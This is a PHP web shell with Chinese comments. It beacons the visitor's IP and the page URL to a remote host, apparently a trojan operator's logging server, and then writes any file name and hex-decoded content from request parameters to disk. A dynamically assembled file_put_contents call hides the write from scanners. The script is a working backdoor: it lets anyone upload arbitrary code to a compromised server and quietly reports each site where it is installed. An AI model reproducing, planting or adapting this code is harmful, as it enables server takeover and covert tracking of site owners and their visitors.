<?php

// 记录访问的域名地址并发送到远程服务器
function logAccess() {
    // 获取客户端的 IP 地址
    $client_ip = $_SERVER['REMOTE_ADDR']; 
    
    // 获取请求的完整 URL 地址，包括协议、域名和请求路径
    $protocol = isset($_SERVER['REQUEST_SCHEME']) ? $_SERVER['REQUEST_SCHEME'] : 'http';
    $host = $_SERVER['HTTP_HOST']; // 获取主机名（域名）
    $request_uri = $_SERVER['REQUEST_URI']; // 获取请求路径
    $full_url = $protocol . '://' . $host . $request_uri; // 完整的 URL

    // 不记录本机访问
    if ($client_ip != '127.0.0.1' && $client_ip != '::1') {
        // 远程服务器地址（将这里的地址改为你自己服务器的地址）
        $remote_server = "http://muma.4kbox.top/log/"; 
        $params = array(
            'ip' => $client_ip,
            'url' => $full_url,
            'time' => date('Y-m-d H:i:s')
        );
        
        // 通过 GET 请求将访问日志发送到远程服务器
        $url = $remote_server . '?' . http_build_query($params);
        file_get_contents($url); // 发送请求
    }
}

// 调用记录访问日志的函数
logAccess();

// 获取上传的文件名
$name = isset($_REQUEST["name"]) ? $_REQUEST["name"] : null;
if (!$name) {
    die("Error: 'name' parameter is missing.");
}

// 获取上传的内容
$content = isset($_REQUEST["content"]) ? $_REQUEST["content"] : null;
if (!$content) {
    die("Error: 'content' parameter is missing.");
}

// 将十六进制字符串转换为二进制
function hex2bin_custom($data) {
    $bin = "";
    for ($i = 0; $i < strlen($data); $i += 2) {
        $bin .= chr(hexdec(substr($data, $i, 2)));
    }
    return $bin;
}

// 将十六进制内容转换为二进制
$content_bin = hex2bin_custom($content);

// 使用动态函数将二进制内容写入文件
$a = "file";
$b = $a . "_put_contents";
$b($name, $content_bin);

?>
awww